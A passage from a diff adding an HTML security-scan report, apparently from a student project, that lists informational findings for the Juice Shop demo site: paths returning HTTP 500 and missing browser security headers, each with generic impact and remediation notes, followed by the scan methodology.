+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Could aid attackers in reconnaissance or be chained with other vulnerabilities to compromise the application.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Review if this path should be publicly accessible. Add authentication if needed.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-info" style="margin-right:10px;">INFO</span>
+          <span class="finding-title">Exposed Sensitive Path</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#41 | CVSS 0.0</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/api/v1</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Server error triggered — possible misconfiguration</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Exposed</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">HTTP 500 | Size: 3017 bytes | No WAF block</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Could aid attackers in reconnaissance or be chained with other vulnerabilities to compromise the application.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Review if this path should be publicly accessible. Add authentication if needed.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-info" style="margin-right:10px;">INFO</span>
+          <span class="finding-title">Exposed Sensitive Path</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#42 | CVSS 0.0</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/profile</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Server error triggered — possible misconfiguration</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Exposed</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">HTTP 500 | Size: 1041 bytes | No WAF block</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Could aid attackers in reconnaissance or be chained with other vulnerabilities to compromise the application.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Review if this path should be publicly accessible. Add authentication if needed.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-info" style="margin-right:10px;">INFO</span>
+          <span class="finding-title">Exposed Sensitive Path</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#43 | CVSS 0.0</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/api/v3</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Server error triggered — possible misconfiguration</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Exposed</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">HTTP 500 | Size: 3017 bytes | No WAF block</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Could aid attackers in reconnaissance or be chained with other vulnerabilities to compromise the application.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Review if this path should be publicly accessible. Add authentication if needed.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-info" style="margin-right:10px;">INFO</span>
+          <span class="finding-title">Exposed Sensitive Path</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#44 | CVSS 0.0</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/api/v1/</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Server error triggered — possible misconfiguration</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Exposed</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">HTTP 500 | Size: 3019 bytes | No WAF block</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Could aid attackers in reconnaissance or be chained with other vulnerabilities to compromise the application.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Review if this path should be publicly accessible. Add authentication if needed.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-info" style="margin-right:10px;">INFO</span>
+          <span class="finding-title">Exposed Sensitive Path</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#45 | CVSS 0.0</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/api</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Server error triggered — possible misconfiguration</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Exposed</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">HTTP 500 | Size: 3011 bytes | No WAF block</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Could aid attackers in reconnaissance or be chained with other vulnerabilities to compromise the application.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Review if this path should be publicly accessible. Add authentication if needed.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-info" style="margin-right:10px;">INFO</span>
+          <span class="finding-title">Exposed Sensitive Path</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#46 | CVSS 0.0</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/api/v2</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Server error triggered — possible misconfiguration</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Exposed</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">HTTP 500 | Size: 3017 bytes | No WAF block</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Could aid attackers in reconnaissance or be chained with other vulnerabilities to compromise the application.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Review if this path should be publicly accessible. Add authentication if needed.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-info" style="margin-right:10px;">INFO</span>
+          <span class="finding-title">Missing Header: Permissions-Policy</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#47 | CVSS 2.0</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Missing Permissions-Policy allows access to powerful browser APIs (camera, mic, etc.).</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Header Check</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">Header &#39;Permissions-Policy&#39; not present in response</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Missing security headers expose users to MIME-sniffing, Clickjacking, and Cross-Site Scripting. It weakens the client-side security posture significantly.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Configure the web server to emit standard security headers: Content-Security-Policy (CSP), X-Frame-Options, X-Content-Type-Options: nosniff, and Strict-Transport-Security (HSTS).
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-info" style="margin-right:10px;">INFO</span>
+          <span class="finding-title">Missing Header: Cross-Origin-Opener-Policy</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#48 | CVSS 2.0</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Missing COOP allows cross-origin pages to access window references.</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Header Check</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">Header &#39;Cross-Origin-Opener-Policy&#39; not present in response</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Missing security headers expose users to MIME-sniffing, Clickjacking, and Cross-Site Scripting. It weakens the client-side security posture significantly.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Configure the web server to emit standard security headers: Content-Security-Policy (CSP), X-Frame-Options, X-Content-Type-Options: nosniff, and Strict-Transport-Security (HSTS).
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-info" style="margin-right:10px;">INFO</span>
+          <span class="finding-title">Missing Header: Cross-Origin-Resource-Policy</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#49 | CVSS 2.0</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Missing CORP allows cross-origin pages to load this site&#39;s resources.</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Header Check</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">Header &#39;Cross-Origin-Resource-Policy&#39; not present in response</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Missing security headers expose users to MIME-sniffing, Clickjacking, and Cross-Site Scripting. It weakens the client-side security posture significantly.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Configure the web server to emit standard security headers: Content-Security-Policy (CSP), X-Frame-Options, X-Content-Type-Options: nosniff, and Strict-Transport-Security (HSTS).
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+  </div>
+
+  <!-- ── METHODOLOGY ── -->
+  <div class="section">
+    <div class="section-title">Methodology</div>
+    <div class="exec-box">
+      <div class="detail-grid">
+        <span class="detail-label">Framework</span>
+        <span class="detail-value">OWASP Testing Guide v4.2 + OWASP Mobile Security Testing Guide</span>
+        <span class="detail-label">Scope</span>
+        <span class="detail-value">https://juiceshop.akto.io/</span>
+        <span class="detail-label">Test Type</span>
+        <span class="detail-value">Black-box automated scanning</span>
+        <span class="detail-label">Modules Run</span>
+        <span class="detail-value">
+          
+          <span class="module-tag" style="margin-right:4px;">Cookie Check</span>
+          
+          <span class="module-tag" style="margin-right:4px;">Header Check</span>
+          
+          <span class="module-tag" style="margin-right:4px;">Path Scanner</span>
+          
+          <span class="module-tag" style="margin-right:4px;">Technology Fingerprinting</span>
+          
+          <span class="module-tag" style="margin-right:4px;">Web Crawler</span>
+          
+        </span>
+        <span class="detail-label">Start Time</span>
+        <span class="detail-value">2026-05-25T19:02:16.800839</span>
+        <span class="detail-label">Report Time</span>
+        <span class="detail-value">2026-05-25 19:16:21</span>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<footer>
+  Generated by <strong>WebPwn Toolkit v1.0</strong> |
+  Holberton IT School — Cyber Security Final Project |
+  2026-05-25 19:16:21 |
+  <em>This report is confidential and for authorized use only.</em>
+</footer>
+
+</body>
+</html>
